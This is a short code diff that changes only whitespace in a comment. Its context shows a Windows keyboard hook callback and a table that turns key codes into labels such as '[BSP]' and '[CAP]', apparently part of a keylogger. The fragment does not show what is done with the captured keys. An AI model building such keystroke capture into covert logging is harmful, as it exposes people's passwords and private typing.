@@ -40,7 +40,7 @@ LRESULT CALLBACK keyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	//Keyboard key to string mapping
 	static char map[][7] =
-	{// 0    -   1    -   2    -   3    -   4    -   5    -   6    -   7    -   8    -   9            Index
+	{    // 0    -   1    -   2    -   3    -   4    -   5    -   6    -   7    -   8    -   9            Index
 		"",      "",      "",      "",      "",      "",      "",      "",      "[BSP]", "\t",	  //   0-9
 		"",      "",      "",      "\n",    "",      "",      "",      "",      "",      "[PSE]", //  10-19
 		"[CAP]", "",      "",      "",      "",      "",      "",      "[ESC]", "",      "",	  //  20-29
